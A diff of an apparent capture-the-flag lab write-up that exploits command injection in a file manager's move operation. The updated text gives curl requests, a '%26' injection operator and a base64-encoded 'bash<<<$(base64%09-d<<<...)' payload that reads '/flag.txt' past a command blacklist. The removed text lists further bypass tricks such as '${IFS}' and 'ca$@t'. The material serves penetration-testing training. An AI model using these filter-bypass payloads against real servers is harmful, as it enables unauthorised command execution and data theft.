@@ -7,85 +7,120 @@
 
 ---
 
-## Status: IN PROGRESS
+## Attack Chain
 
----
+### 1. Recon
 
-## Recon
-
-Login redirects to `index.php?to=` (not `index.php` or `/`).
+Login redirects to `index.php?to=`. App lists files hosted in `/var/www/html/files`.
 
 ```bash
-# Login and save session cookie
-curl -v -c /tmp/fm.txt -X POST 'http://154.57.164.80:31504/?to=' -d "fm_usr=guest&fm_pwd=guest"
-# → 302 redirect to http://154.57.164.80:31504/index.php?to=
-# → Sets cookie: filemanager=<session>
+curl -v -c /tmp/fm.txt -X POST 'http://TARGET/?to=' -d "fm_usr=guest&fm_pwd=guest"
+# → 302 redirect, sets cookie: filemanager=<session>
 ```
 
-App structure:
-- Web root: `/var/www/html/files`
-- Files listing at `index.php?to=` (root) and `index.php?to=tmp` (subfolder)
-- `tmp` folder is empty
-- 10 `.txt` files in root, all 31 bytes except one (78 bytes)
-- Running on Apache/2.4.41 (Ubuntu)
+Files in root: 10 `.txt` files (31 bytes each). Subfolder: `tmp/`.
 
-### Parameters Identified
+### 2. Identify Parameters
+
 | Parameter | Location | Purpose |
 |-----------|----------|---------|
-| `to` | GET | Directory navigation |
+| `to` | GET | Directory navigation / move destination |
+| `from` | GET | Move/copy source file |
+| `finish` | GET | Confirm move/copy |
+| `move` | GET | Flag: move vs copy |
 | `view` | GET | View file content |
 | `dl` | GET | Download file |
-| `from` | GET | Copy source file |
-| `new` | GET | New file/folder name |
-| `p` | GET/POST | Path for operations |
-| `type` | GET/POST | File type or action type |
-| `ren` | GET | Rename source |
-| `finish` | GET | Confirm copy/move |
-| `move` | GET | Move flag (vs copy) |
-| `content` | POST | Search query / file save content |
 
-### Search Endpoint Notes
-The Advanced Search feature POSTs to `window.location` with:
-```javascript
-{ajax: true, content: searchTxt, path: path, type: 'search'}
+### 3. Find the Injection Point
+
+The **move operation** uses all four parameters together:
 ```
-All attempts to trigger AJAX search handler returned full HTML (handler not triggered).
-TFM's search internally uses PHP's `RecursiveDirectoryIterator` — NOT a shell command.
+GET /index.php?to=DEST&from=SOURCE&finish=1&move=1
+```
+
+TFM passes `to=` to a shell command. This is the injection point.
+
+**Critical:** All four parameters (`to`, `from`, `finish`, `move`) must be present. Requests missing any of them do not trigger the shell command.
+
+### 4. Enumerate the Filter
+
+Testing `to=tmp%0awhoami` → `Malicious request denied!`  
+`%0a` (newline) is detected and blocked.
+
+Testing `to=tmp%26whoami` → error about mv (command ran, `whoami` is filtered)  
+`%26` (`&`) is **NOT** blocked as an operator.
+
+The filter has two layers:
+- Blocks `%0a` operator (newline)  
+- Blocks common command names (`whoami`, `cat`, etc.) directly
+- Does NOT block `%26` operator
+
+### 5. Bypass the Command Filter — Base64 Nuclear Option
+
+Since commands are blacklisted by name, encode the entire command in base64. The filter cannot inspect inside the encoded payload.
+
+```bash
+# Encode the command locally
+echo -n 'cat /flag.txt' | base64
+# → Y2F0IC9mbGFnLnR4dA==
+
+# With trailing newline (ensures clean shell termination)
+echo 'cat /flag.txt' | base64
+# → Y2F0IC9mbGFnLnR4dAo=
+```
+
+Space bypass: use `%09` (tab) between `base64` and `-d`. `${IFS}` may itself be filtered.
+
+Injection payload:
+```
+%26bash<<<$(base64%09-d<<<Y2F0IC9mbGFnLnR4dAo=)
+```
+
+### 6. Final Request
+
+```
+GET /index.php?to=tmp%26bash<<<$(base64%09-d<<<Y2F0IC9mbGFnLnR4dAo=)&from=2470930823.txt&finish=1&move=1 HTTP/1.1
+Host: 154.57.164.80:31504
+Cookie: filemanager=<session>
+```
+
+Flag content appears in the HTML response body.
 
 ---
 
-## Injection Point Investigation
+## Key Lessons
 
-### GET Parameters Tested (all returned no command output)
-- `?to=.%0awhoami` — no output
-- `?to=&view=test%0aid` — no output  
-- `?to=&dl=test%0aid` — no output
-- `?to=tmp&from=test%0aid&finish=1` — no output
-- `?to=tmp%0aid&from=51459716.txt&finish=1` — no output
-- `?p=.%0aid&new=test&type=file` — no output
-- `?p=&new=test%0aid&type=file` — no output
+### What the filter blocks
+- `%0a` (newline) as injection operator — "Malicious request denied!"
+- Common command names directly: `whoami`, `cat`, `ls`, `id`
 
----
+### What bypasses the filter
+- `%26` (`&`) as injection operator — not in the blacklist
+- Base64 encoding the entire command — filter cannot inspect encoded payload
+- `%09` (tab) as space inside the base64 invocation
 
-## TODO: Complete Skills Assessment
-- Continue testing remaining parameters and POST actions
-- Test `ren` parameter
-- Test backup POST action (`path=&file=&type=backup&ajax=true`)
-- Compare response sizes (`wc -c`) to detect blind injection
-- Test with existing filenames in injection (e.g. `view=51459716.txt%0aid`)
+### Operator enumeration is mandatory
+`%0a` is not always the right operator. Always test ALL operators in isolation on the confirmed injection point before assuming newline is correct:
+- `%0a` → blocked here
+- `%26` → worked here
+- `%3b` → not tested
+- `%7c` → not tested
 
----
+### Complete request structure required
+For TFM move operation, ALL four parameters must be present or the shell command is never invoked. Partial requests (`to=` alone, or without `finish=1&move=1`) return HTML without executing anything.
 
-## Key Lessons (from module sections, pre-assessment)
+### Track target state during testing
+Move/copy operations change which files exist in which directories. Using a `from=` file that has already been moved causes the operation to fail silently. Always check the current file listing before constructing requests.
 
-- **Front-end validation bypass:** Inject directly via curl/Burp — browser pattern check is bypassed
-- **Enumerate filter layers independently:** Test operator alone → space alone → command alone
-- **Newline (`%0a`) is the go-to operator** — almost never blacklisted
-- **Character + command are two separate filter layers** — newline passed but `whoami` was still blocked by command filter in exercises
-- **Full bypass stack:** `%0a` + `${IFS}` + `${PATH:0:1}` + `ca$@t` covered all exercise filters
-- **Base64 nuclear option:** Encodes entire command including pipes, spaces, slashes — nothing needs to survive filter
-  ```bash
-  echo -n 'cmd with | pipes and /slashes' | base64
-  bash<<<$(base64${IFS}-d<<<BASE64)
-  ```
-- **Always use single quotes in curl** to prevent local `${IFS}` shell expansion
+### Base64 payload: include trailing newline
+`Y2F0IC9mbGFnLnR4dAo=` (from `echo 'cat /flag.txt' | base64`) includes a trailing newline, which ensures the decoded command terminates cleanly in the shell.  
+`Y2F0IC9mbGFnLnR4dA==` (from `echo -n`) lacks this and may cause silent failures in some contexts.
+
+### Finding output in the response
+Do not grep for assumed flag formats like `HTB{...}` — the flag might not match. Use diff against a clean baseline to isolate exactly what the command output added to the response.
+
+```bash
+curl -s -b /tmp/fm.txt 'http://TARGET/index.php?to=tmp' > /tmp/base.html
+curl -s -b /tmp/fm.txt 'http://TARGET/index.php?to=tmp%26PAYLOAD&from=FILE&finish=1&move=1' > /tmp/inj.html
+diff /tmp/base.html /tmp/inj.html
+```
